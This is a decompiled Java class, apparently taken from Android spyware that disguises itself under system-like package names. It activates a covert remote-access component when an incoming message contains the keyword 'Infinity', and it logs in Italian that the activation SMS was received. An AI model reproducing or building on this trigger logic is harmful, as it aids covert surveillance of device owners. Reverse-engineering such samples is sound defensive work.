package com.app.system.common.g;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.android.system.ActivationReceiver;

public class a
{
  public static boolean a(Context paramContext, String paramString)
  {
    if (paramString == null) {
      return false;
    }
    if (paramString.contains("Infinity"))
    {
      com.security.d.a.d("RemoteAccessCmd", "RICEVUTO SMS ATTIVAZIONE", new Object[0]);
      paramString = paramContext.getSharedPreferences("pref", 0).edit();
      paramString.putBoolean("activation-sms-received", true);
      paramString.commit();
      ActivationReceiver.c(paramContext);
    }
    return false;
  }
}


/* Location:              ~/com/app/system/common/g/a.class
 *
 * Reversed by:           J
 */